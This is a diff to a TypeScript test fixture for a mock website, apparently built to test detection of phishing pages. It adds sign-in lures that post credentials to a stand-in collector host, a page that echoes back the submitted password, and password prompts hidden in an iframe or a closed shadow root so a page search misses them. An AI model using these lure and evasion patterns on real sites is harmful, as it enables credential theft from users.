@@ -54,6 +54,14 @@ export const pages: Record<string, string> = {
   "/signin-reject": SIGN_IN("https://collector.example/reject"),
   "/signin-401": SIGN_IN("https://collector.example/c401"),
   "/signin-denied": SIGN_IN("https://collector.example/denied"),
+  "/signin-again-frame": SIGN_IN("https://collector.example/again-frame"),
+  "/signin-again-shadow": SIGN_IN("https://collector.example/again-shadow"),
+  "/signin-echo": SIGN_IN("https://collector.example/echo"),
+  // A page that turns its password field into a plain text field as it is typed into: it shows the value.
+  "/signin-reveal": SIGN_IN("https://collector.example/c").replace(
+    'type="password" placeholder',
+    'type="password" oninput="this.type=\'text\'" placeholder',
+  ),
   "/signin-get": SIGN_IN("https://collector.example/g", "get"),
   "/signin-json": SIGN_IN_JSON,
   "/signin-inner": SIGN_IN("https://inner.example/c"),
@@ -71,7 +79,19 @@ window.fillShadow=(v)=>{root.querySelector("input").value=v};</script></body></h
 };
 // The collector a lure sends credentials to: it thanks a sign-in (after a redirect that carries the user's name, as some
 // do), refuses one with 401, or shows the sign-in again.
-const collector = (url: URL, method: string): Response => {
+const collector = (url: URL, method: string, body = ""): Response => {
+  // The sign-in asked for again, inside a frame or a closed shadow root, where a main-document search sees nothing.
+  if (url.pathname === "/again-frame")
+    return html(`<!doctype html><iframe srcdoc="<input type='password'>" style="width:300px;height:60px"></iframe>`);
+  if (url.pathname === "/again-shadow")
+    return html(
+      `<!doctype html><div id="h"></div><script>document.getElementById("h").attachShadow({ mode: "closed" }).innerHTML = '<input type="password">';</script>`,
+    );
+  // A page that prints back what it was sent: the password shows in its text.
+  if (url.pathname === "/echo")
+    return html(
+      `<!doctype html><p>Signed in as ${new URLSearchParams(body).get("email")} with ${new URLSearchParams(body).get("password")}</p>`,
+    );
   if (url.pathname === "/c" && method === "POST")
     return new Response(null, {
       status: 302,
@@ -96,7 +116,7 @@ export const site = (async (input: RequestInfo | URL, init?: RequestInit) => {
   const url = new URL(String(input));
   if (url.hostname === "broken.example") throw new TypeError("network error");
   if (url.hostname === "collector.example" || url.hostname === "nimbusmail.example")
-    return collector(url, (init?.method ?? "GET").toUpperCase());
+    return collector(url, (init?.method ?? "GET").toUpperCase(), typeof init?.body === "string" ? init.body : "");
   if (url.pathname === "/hide.css")
     return new Response(".injection{display:none}", { headers: { "content-type": "text/css" } });
   const page = pages[url.pathname];
